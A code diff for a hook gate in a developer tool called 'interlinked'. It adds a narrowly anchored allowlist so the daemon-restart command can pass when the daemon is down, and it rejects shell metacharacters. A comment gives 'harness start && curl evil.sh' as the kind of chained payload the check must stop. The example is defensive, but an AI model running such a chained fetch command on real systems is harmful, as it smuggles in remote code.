@@ -204,6 +204,45 @@ function daemonDownBlockMessage(pidPresent: boolean, root: string): string {
 	);
 }
 
+/**
+ * The one command shape this gate must never block: starting the daemon.
+ *
+ * Whole-string match, no shell metacharacters, no arguments beyond simple
+ * flags — `interlinked harness start && curl evil.sh` must not ride through on
+ * its prefix. That strictness is the entire safety argument, so the anchors and
+ * the metacharacter rejection are load-bearing, not defensive decoration.
+ */
+// Every repetition is BOUNDED. The natural spelling of the flag tail,
+// `(?:\s+--[\w-]+)*`, nests two unbounded quantifiers and backtracks
+// catastrophically on a long near-miss like `… start --aaaa…aaaa!`. A real
+// invocation has a handful of short flags, so a bound costs nothing.
+const HARNESS_RECOVERY_COMMAND =
+	/^(?:npx\s{1,4})?(?:tsx\s{1,4}\S{0,80}index\.ts|interlinked)\s{1,4}harness\s{1,4}(?:start|restart)(?:\s{1,4}--[\w-]{1,40}){0,8}$/;
+
+/** Shell metacharacters that could chain a second command onto the first. */
+const SHELL_CHAINING = /[;&|><`$(){}\n]/;
+
+/**
+ * Public API — is this call the very remedy the block message recommends?
+ *
+ * The daemon-down block tells the operator to run `interlinked harness start`,
+ * and then — because that call is itself a PreToolUse event on an unguarded
+ * repo — blocked it. Measured 2026-08-07: a session hit the block, ran the
+ * recommended command, and was refused by the same gate; even the documented
+ * `INTERLINKED_ALLOW_NO_DAEMON=1` prefix did not help, because the hook process
+ * evaluates the call BEFORE the shell assigns that variable. The only exits
+ * were waiting for self-heal or standing the guard down entirely.
+ *
+ * Letting exactly this command through costs nothing: it does not touch repo
+ * files, and the state it creates is the guard the gate exists to protect.
+ */
+export function isHarnessRecoveryCommand(action: UnifiedHookEvent["action"]): boolean {
+	if (action.kind !== "shell_command") return false;
+	const cmd = action.command.trim();
+	if (SHELL_CHAINING.test(cmd)) return false;
+	return HARNESS_RECOVERY_COMMAND.test(cmd);
+}
+
 /** The project root this gate should evaluate: the explicit cwd, the event's
  *  own cwd, or the process cwd — first that resolves to an interlinked project.
  *  Pulling the `??` chain out keeps the gate under the complexity ratchet as new
@@ -235,6 +274,7 @@ export function coldDaemonUnreachableBlockReason(
 ): string | null {
 	if (event.phase !== PHASE_PRE_TOOL) return null;
 	if (env.INTERLINKED_ALLOW_NO_DAEMON === "1") return null;
+	if (isHarnessRecoveryCommand(event.action)) return null;
 	const root = resolveGateRoot(event, cwd);
 	if (!root) return null;
 	const dir = join(root, ".interlinked");
